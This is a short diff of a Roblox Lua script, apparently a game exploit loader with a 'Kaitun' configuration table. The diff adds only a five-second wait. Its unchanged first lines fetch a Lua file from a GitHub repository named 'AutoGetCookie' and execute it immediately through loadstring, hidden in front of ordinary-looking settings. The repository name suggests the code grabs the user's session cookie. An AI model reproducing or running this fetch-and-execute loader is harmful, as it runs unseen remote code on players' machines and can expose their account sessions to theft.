@@ -1,6 +1,7 @@
 spawn(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ThanhTuoi852123/AutoGetCookie/refs/heads/main/asd33.lua"))()
 end)
+wait(5)
 getgenv().ConfigsKaitun = {
 	["Block Pet Gift"] = true,
 
